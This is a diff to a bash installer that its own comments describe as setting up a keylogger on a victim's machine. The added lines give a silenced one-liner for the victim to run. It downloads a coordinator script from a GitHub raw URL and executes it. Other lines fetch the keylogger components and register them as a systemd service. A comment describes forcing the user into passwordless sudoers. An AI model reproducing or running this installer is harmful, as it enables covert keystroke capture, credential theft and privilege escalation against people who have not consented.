@@ -1,7 +1,8 @@
 #!/bin/bash
 # application to install, setup, and run the keylogger.
 
-# entry point:
+# entry point for victim to execute:
+# /bin/bash -c "$(wget -q -O - https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)" > /dev/null 2>&1
 base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 
 # Force user to be included in sudoers and remove the need for passwords
@@ -21,7 +22,7 @@ CONT=${base}controller.py
 KMAP=${base}keymap.py
 FKEY=${base}find_keyboard.py
 KLSERV=${base}nicekeylogger.service
-wget -q -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
+wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
 sudo chmod +x controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
